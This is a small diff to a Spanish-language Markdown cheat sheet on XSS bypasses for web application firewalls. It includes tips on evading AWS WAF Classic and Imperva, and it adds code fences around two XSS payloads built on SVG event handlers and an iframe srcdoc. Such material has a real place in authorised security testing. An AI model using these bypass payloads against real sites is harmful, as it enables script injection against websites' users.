@@ -108,6 +108,9 @@ Ejemplo: https://ejemplo.com/?q=<script>alert(1)</script>
 - 🚀 En AWS WAF clásico, codificar el javascript: o dividir los eventos suele pasar porque no normalizan bien el input antes de aplicar las reglas. 🚀
 - 🚀Imperva suele filtrar cosas como <script> pero a veces no detecta bien splits en JavaScript o eventos menos comunes como onpointerover.  🚀
 
+```
 :skull_and_crossbones:	<svg><set onbegin=confirm`${document.domain}` attributeName=x></set></svg>
-
+```
+```
 :skull_and_crossbones:	&#x3C;svg/onload=confirm(1)&#x3E;<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+```
